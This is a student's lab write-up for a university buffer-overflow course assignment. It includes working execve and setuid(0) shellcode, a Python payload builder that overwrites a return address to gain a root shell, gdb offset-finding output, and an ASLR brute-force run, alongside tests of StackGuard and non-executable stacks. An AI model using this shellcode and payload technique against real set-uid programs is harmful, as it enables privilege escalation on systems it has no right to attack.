<p align="center">
    Lab 03 - Buffer Overflow Attack <br/>
    By Patrick O'Connor <br/>
    v75j556 <br/>
    CSCI 476 - Spring 2021 <br/>

</p>

# Table of Contents
- [ About this project ](#desc)
	- [ File Structure ](#struct)
- [ Task Answers ](#tasks)
- [Contact](#contact)
	- <a href= "mailto: p.oconnormsu@gmail.com?subject= Lab 01 OConnor"> Click here to send email</a>

<a name="desc"></a>
# About this project
In this lab, students will be given a program with a buffer-overflow vulnerability; their task is to develop a scheme to exploit the vulnerability, and ultimately gain root privileges on the system. In addition to the attacks we study, students will be guided through several protection schemes that have been implemented in the operating system as countermeasures to buffer-overflow attacks. Students will evaluate how the schemes work as well as their potential limitations.



Started: February 22, 2021
\
Last Updated: March 03, 2021
\
Due Date: March 02, 2021

<a name="struct"></a>
# File Structure
- lab03
	- README.md

<a name="tasks"></a>
#   Task 1: Getting Familiar with Shellcode
The ultimate goal of the buffer-overflow attacks we’ll study in this lab is to inject malicious code into the target program, so the code can be executed using the target program’s privileges. Shell-code is widely used in most code-injection attacks. In this task we will spend some time getting familiar with shell-code.
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Binary code for setuid(0)
// 64-bit:  "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
// 32-bit:  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"

const char shellcode[] =
#if __x86_64__ // 64-bit shellcode
    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else // 32-bit shellcode
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;

int main(int argc, char **argv)
{
    char code[500];

    strcpy(code, shellcode);
    int (*func)() = (int (*)())code;

    func();
    return 1;
}
```  
##  Task 1.1: Please compile and run both executables, and describe your observations.
Using the make-file I compiled both of the files. After compiling I ran these binary files with ```./a32.out``` and ```./a64.out```.

##  Task 1.2: Please briefly describe what this program is doing; i.e., what does the code in main() actually do?
This code is creating two stack-frames on the main stack and within there we are allocating a space of 500 characters. We then call string copy which pushes a new value on the stack which is located at the destination of ```code[500]``` and includes the ```shellcode[]```. From there we creating a pointer ```(*func()()``` to point to code. We then call this ```func()```. This ```func()``` is where we place the buffer overflow injection as ```strcp``` will overwrite until reaching null value.


#   Task 2: Attacking a Vulnerable 32-bit Program (Level 1)
In this task, you need to compile the vulnerable program into a 32-bit binary called ```stack-L1```. To exploit the buffer-overflow vulnerability in the target program, the most important thing to know is the distance between the buffer’s starting position and the place where the return-address is stored. We will use a debugging method to determine this value. Since we have the source code of the target program, we can compile it with the debugging flag ```-g``` turned on, which makes debugging a lot more convenient. (You should be using our provided Makefile. If you are, when you run ```make```, the debugging version should be created automatically.)

##  Task 2.1: Finding the Return Address
Before running the program under ```gdb```, we need to create a file called ```badfile```. After creating ```badfile``` we can set a break point at function call with ```b bof```. Stepping through gdb we can find the ```gdb``` values detailed below of ```ebp``` and ```buffer```.
\
Now that we see ```strcpy``` we know for a fact that we are inside out function and can correctly get the address of ebp and buffer. Using the built in function we can get the correct offset ($ebp-&buffer + size of return address(4))
\
```21	    strcpy(buffer, str);
gdb-peda$ p $ebp
$1 = (void *) 0xffffcda8
gdb-peda$ p &buffer
$2 = (char (*)[100]) 0xffffcd3c
gdb-peda$ p/d 0xffffcda8 - 0xffffcd3c
$3 = 108
```

##  Task 2.2: Launching Your Attack
To exploit the buffer-overflow vulnerability in the target program, you need to prepare a payload, and save it inside ```badfile```. One could do this manually (sounds tedious…) or use another program, such as a Python script to help us make our ```badfile```. The contents of my ```badfile``` can be found below.
``` py

#!/usr/bin/python3
import sys

# TODO: Replace the content with the actual shellcode
shellcode = (

    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"

).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 517-len(shellcode)       # TODO: Change this number
content[start:start + len(shellcode)] = shellcode

# Decide the return address value and put it somewhere in the payload
ret = 0xffffcda8 +  0xD8      # TODO: ebp + gdb delta
offset = 112      # TODO: Change this number $ebp-&buffer + size of return address

L = 4           # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)

```
\
This ```badfile``` with inputs created in ```TODO``` locations successfully got me to have a root shell. I struggled with finding the correct offset as I was forgetting the size of return address needed to be added within the program. This is was the hardest part for me just because of human error. The details for deciding the numbers can be found from examining part 1 and stepping through ```gdb```.


#   Task 3: Attacking a Vulnerable 32-bit Program Without Knowing the Buffer Size (Level 2)
In this task, you need to compile the vulnerable program into a 32-bit binary called ```stack-L2```. In the previous task (Level 1), you were able to use ```gdb``` to determine the size of the buffer. In the real world, this piece of information is unlikely to be so readily accessible. For example, if the target is a server program running on a remote machine, we will not be able to get a copy of the binary or source code, making our approach in the previous task infeasible. In this task, we are going to add a constraint: you can still use ```gdb```, but you are not allowed to use it to derive the buffer size.

\
My approach for task 3 is to use ```gbd``` to break down the execution of ```StackL2```. Through this we will see when ```ebp``` and ```esp``` match and therefore we can find the address of ```ebp``` which is the base-pointer within ```gdb```. Adding some bits to return address to compensate for the overhead of ```gdb``` we have a valid return address.  With this information we can create a NOP sled that continuously holds the return address (address-spraying) across the entirety of the buffer range (100-200 bytes). With this we will end up hitting the actual location of the return address. Along with this I will need to align the shellcode so that it is completely on a line.
```
EBP: 0xffffd1b8 --> 0xffffd3e8 --> 0x0
ESP: 0xffffcda8 --> 0xffffd1b8 --> 0xffffd3e8 --> 0x0
```
\
I unfortunately was unable to achieve a root shell and continuously received segmentation faults with a multitude of different attempts. I believe that the technique detailed above should have got me to my end destination of getting a root shell. If there are any breaks in my logic please let me know as I am truly intrigued to find a solution to this task and will be asking Travis for further instruction as well. 



#   Task 4: Defeating dash’s Countermeasure
The ```dash``` shell in the Ubuntu OS drops privileges when it detects that the effective UID is not equal to the real UID (i.e., EUID != RUID), which is the case in a set-uid program. This is achieved by changing the effective UID back to the real UID, essentially, dropping any elevated privilege.

In previous tasks, we let ```/bin/sh``` points to another shell called ```zsh```, which does not implement this countermeasure. In this task, we will change our shell back to ```dash```, and see how we can defeat this countermeasure.

First, set your shell back to ```dash```:
```
sudo ln -sf /bin/dash /bin/sh
```
To defeat the countermeasure in our buffer-overflow attacks, all we need to do is to change the real UID, so it equals the effective UID. When a root-owned set-uid program runs, the effective UID is zero, so before we invoke the shell program, we just need to change the real UID to zero (which we can do… because at the time that we do this we are effectively running as root!). We can achieve this by invoking ```setuid(0)``` before executing ```execve()``` in the shellcode. The assembly code to do this is already inside the ```call_shellcode.c``` code (it is commented out at the top of the file.) You just need to add it to the beginning of the shellcode.

##  Task 4.1: Experimenting with Set-UID Assembly Code
Compile call_shellcode.c into root-owned binary.
\
Run both the a32.out and a64.out shellcode programs with and without the assembly that makes the setuid(0) system call.
\
After adding the ```setuid(0)``` assembly before executing ```execve()``` we achieved a root shell for both the 32 bit and 64 bit. This is interesting as it leads us to believe we can atleast get past some of the basic countermeasures in place.
The 32-bit printout proof is below:
```
seed@VM:~/.../shellcode$ ./a32.out
$ exit
[03/04/21]seed@VM:~/.../shellcode$ make setuid
gcc -m32 -z execstack -o a32.out call_shellcode.c
gcc -z execstack -o a64.out call_shellcode.c
sudo chown root a32.out a64.out
sudo chmod 4755 a32.out a64.out
[03/04/21]seed@VM:~/.../shellcode$ ./a32.out
#
```

##  Task 4.2: Launching the Attack (Again)
Now, using the updated shellcode from the previous task, we can attempt the attack again on the vulnerable program, and this time, with the shell’s countermeasure turned on. Repeat your attack on the Level 1 executable (Task 2), and see whether you can get a root shell.
\
After getting a root shell, please run the following commands to prove that (1) you are using a shell with countermeasure, and (2) you are running in a shell as root.

```
# ls -l /bin/sh /bin/zsh /bin/dash
# id
```
```
seed@VM:~/.../code$ ./stack-L1
Input size: 517
# ls -l /bin/sh /bin/zsh /bin/dash
-rwxr-xr-x 1 root root 129816 Jul 18  2019 /bin/dash
lrwxrwxrwx 1 root root      9 Mar  4 02:01 /bin/sh -> /bin/dash
-rwxr-xr-x 1 root root 878288 Feb 23  2020 /bin/zsh
# id
uid=0(root) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
#
```
\
This is while logical was extremely interesting and not something I initially thought would be this easy of a work around. This is logical as we saw in Task 4.1 that we are effectively running the ```setuid(0)``` and ```execve()``` from root. I am assuming more sophisticated countermeasures are to come in later task but for now this is frightening, exciting, and quite simple plug in play if you have access to a working buffer-overflow program.


#   Task 5: Defeating ASLR
On 32-bit Linux machines, stacks only have 19 bits of entropy, which means the base address for the stack can have 524,288 possibilities. This number is not that high and can be exhausted easily with a brute-force approach. In this task, we use such an approach to defeat the ASLR countermeasure on our 32-bit VM.

##  Task 5.1: Attacking a System with ASLR Enabled
First, turn on ASLR using the following command: ```sudo /sbin/sysctl -w kernel.randomize_va_space=2```
\
Then run the same kind of attack as before against ```stack-L1```
\
The results from running the same attack as done in task 2 is a segmentation fault. This is because ASLR randomizes the address space deeming are predetermined return address as each time the addresses are changed to randomized locations thus helping keep memory address associated with running processes not predictable.

##  Task 5.2: A Brute Force Attack on a System with ASLR Enabled
Now, we can use a brute-force approach to attack the vulnerable program repeatedly, hoping that the address we put in the ```badfile``` will eventually be correct… For this task, you can use the following shell script to invoke the vulnerable program repeatedly (i.e., in an infinite loop!). If your attack succeeds, the script will stop; otherwise, it will keep running.

Please describe your observations and provide supporting evidence.
\
After running for just 25 second and running a total of roughly 21,000 times a root shell was returned in ```StackL1```.
```
The program has been run 20915 times so far (time elapsed: 0 minutes and 25 seconds).
Input size: 517
./brute-force.sh: line 13: 38708 Segmentation fault      ./stack-L1
The program has been run 20916 times so far (time elapsed: 0 minutes and 25 seconds).
Input size: 517
#
```

This speed was extremely surprising in that within less than half a minute I was able to obtain root access even with a countermeasure on. I was unsure if this was a fast attempt and ended up receiving an even faster success on the second attempt (14 seconds). Although this is fast I believe that having a spike in attempts to access something 20916 times would hopefully throw some red flags for administrators.


#   Task 6: Experimenting with Other Countermeasures
In this task we will explore some of the other countermeasures that exist to defend against buffer overflow attacks.

##  Task 6.1: Turn on the StackGuard Protection
Many compilers, such as ```gcc```, implement a security mechanism called StackGuard to prevent buffer overflows. In the presence of this protection, the buffer overflow attacks we’ve studied in this lab will not work. In our previous tasks, we disabled the StackGuard protection mechanism when compiling the programs. In this task, we will turn it back on and see what happens.
\
First, repeat the Level-1 attack (Task 2) with StackGuard off, and make sure that the attack is still successful. Then, turn on the StackGuard protection by recompiling the vulnerable ```stack.c``` program without the ```-fno-stack-protector``` flag. (In ```gcc``` version 4.3.3 and above, StackGuard is enabled by default.) Now, conduct your attack again.
\

Using just ```gcc``` without the flag did not work for me so I went and made the directory clean with ```make clean```. After this I edited the ```Makefile``` to no include ```-fno-stack-protector```. This successfully turned on StackGuard Protection. The result of rerunning ```./stack-L1``` was ```Input size: 517
*** stack smashing detected ***: terminated
Aborted
[03/04/```

\
This is expected as it noticed that my program was smashing all of the return addresses and aborted process.
##  Task 6.2: Turn on the Non-Executable Stack Protection
 The kernel and dynamic linker can use this information to decide whether to make the stack of this running program executable or non-executable. Specifying this information is done automatically by our compiler, ```gcc```, which by default makes stack non-executable. While non-executable stacks is the default setting these days, we can specifically make it non-executable using the ```-z noexecstack``` flag when we compile the program. In our previous tasks, we have used ```-z execstack``` to make stacks executable.
 \
 In this task, we will make the stack non-executable. If you recall from Task 1, the ```call_shellcode``` program puts a copy of shellcode on the stack, and then executes the code from the stack. Please recompile ```call_shellcode.c``` into a32.out and a64.out without the ```-z execstack``` option.
 \
 I once again could not get them to recompile without option so I resorted to ```Makefile```. I would assume this is user error on my side.
 \
 After successfully removing and remaking, I recieved a segmentation fault that can be seen below. This is because we have a non-executable stack that is attempting to create a shell. Therefore this is expected as the we have executable code within non-executable stack and this is not a processable request. As noted below in the directions there are possible vulnerabilities that can be attacked such as return-to-libc attack which uses code that has been already placed in memory.

 ```
seed@VM:~/.../shellcode$ ./a32.out
Segmentation fault
 ```



<a name="contact"></a>
<a href= "mailto: p.oconnormsu@gmail.com?subject= Lab 01 OConnor"> Click here to send email</a>
